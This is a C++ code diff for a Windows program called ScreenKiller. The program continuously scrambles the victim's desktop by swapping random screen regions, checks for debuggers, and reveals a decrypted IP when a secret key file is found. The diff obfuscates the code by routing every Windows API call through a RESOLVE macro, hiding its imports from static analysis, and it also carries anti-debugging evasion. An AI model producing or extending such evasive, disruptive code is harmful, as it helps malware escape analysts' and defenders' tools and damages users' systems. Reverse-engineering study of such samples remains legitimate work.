@@ -26,7 +26,7 @@ void ScreenKiller::deploy()
 {
 	this->m_alive = true;
 
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//RESOLVE(user32.dll, ShowWindow)(GetConsoleWindow(), SW_HIDE);
 
 	this->m_runner_thread = std::thread([this] {this->deploy_inner(); });
 }
@@ -47,15 +47,15 @@ bool ScreenKiller::deploy_inner()
 
 	HWND hDesktop = NULL;
 	ScreenProps screen_props = { 0 };
-	hDesktop = GetDesktopWindow();
+	hDesktop = RESOLVE(user32.dll, GetDesktopWindow)();
 
-	screen_props.hdcScreen = GetDCEx(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);
+	screen_props.hdcScreen = RESOLVE(user32.dll, GetDCEx)(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);
 
 	srand(GetTickCount64() % UINT32_MAX);
 
 	RECT desktop = { 0 };
 	
-	GetWindowRect(hDesktop, &(screen_props.rectScreen));
+	RESOLVE(user32.dll, GetWindowRect)(hDesktop, &(screen_props.rectScreen));
 
 	while (this->m_alive)
 	{
@@ -99,7 +99,7 @@ void ScreenKiller::exit_if_debugged()
 
 bool ScreenKiller::is_debugged1()
 {
-	return IsDebuggerPresent();
+	return RESOLVE(kernel32.dll, IsDebuggerPresent)();
 }
 
 bool ScreenKiller::is_debugged2()
@@ -123,7 +123,8 @@ bool ScreenKiller::is_debugged2()
 		
 		processList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 		processInformation = { sizeof(PROCESSENTRY32W) };
-		if (!(Process32FirstW(processList, &processInformation)))
+		
+		if (!(RESOLVE(kernel32.dll, Process32FirstW)(processList, &processInformation)))
 		{
 			return false;
 		}
@@ -142,9 +143,9 @@ bool ScreenKiller::is_debugged2()
 			{
 				count_instances++;
 			}
-		} while (Process32NextW(processList, &processInformation));
+		} while (RESOLVE(kernel32.dll, Process32NextW)(processList, &processInformation));
 
-		CloseHandle(processList);
+		RESOLVE(kernel32.dll, CloseHandle)(processList);
 
 		return count_instances > 1;
 }
@@ -165,7 +166,7 @@ void ScreenKiller::check_secret_file()
 	std::string encoded_key = encode_string(secret_buf);
 	
 	if (encoded_key == ENCODED_KEY)
-		MessageBoxA(NULL, (decrypt_ip(secret_buf)).c_str(), OBFUSCATE("Hmmm").c_str(), NULL);
+		RESOLVE(user32.dll, MessageBoxA)(NULL, (decrypt_ip(secret_buf)).c_str(), OBFUSCATE("Hmmm").c_str(), NULL);
 }
 
 VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj) 
@@ -176,12 +177,12 @@ VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj)
 	HBITMAP hBitmap = NULL;
 	int iWidth, iHeight, iX1, iY1, iX2, iY2;
 
-	hdcMemory = CreateCompatibleDC(hdcScreen);
+	hdcMemory = RESOLVE(gdi32.dll, CreateCompatibleDC)(hdcScreen);
 
 	iWidth = abs(rectScreen.left - rectScreen.right) / DIVIDERS;
 	iHeight = abs(rectScreen.top - rectScreen.bottom) / DIVIDERS;
 
-	SelectObject(hdcMemory, hBitmap);
+	RESOLVE(gdi32.dll, SelectObject)(hdcMemory, hBitmap);
 
 	while (TRUE)
 	{
@@ -192,11 +193,11 @@ VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj)
 		iY1 = rectScreen.top + iHeight * (rand() % DIVIDERS);
 		iY2 = rectScreen.top + iHeight * (rand() % DIVIDERS);
 
-		BitBlt(hdcMemory, 0, 0, iWidth, iHeight, hdcScreen, iX1, iY1, SRCCOPY);
-		BitBlt(hdcScreen, iX1, iY1, iWidth, iHeight, hdcScreen, iX2, iY2, SRCCOPY);
-		BitBlt(hdcScreen, iX2, iY2, iWidth, iHeight, hdcMemory, 0, 0, SRCCOPY);
+		RESOLVE(gdi32.dll, BitBlt)(hdcMemory, 0, 0, iWidth, iHeight, hdcScreen, iX1, iY1, SRCCOPY);
+		RESOLVE(gdi32.dll, BitBlt)(hdcScreen, iX1, iY1, iWidth, iHeight, hdcScreen, iX2, iY2, SRCCOPY);
+		RESOLVE(gdi32.dll, BitBlt)(hdcScreen, iX2, iY2, iWidth, iHeight, hdcMemory, 0, 0, SRCCOPY);
 
-		Sleep(10);
+		RESOLVE(kernel32.dll, Sleep)(10);
 	}
 
 	DeleteDC(hdcMemory);
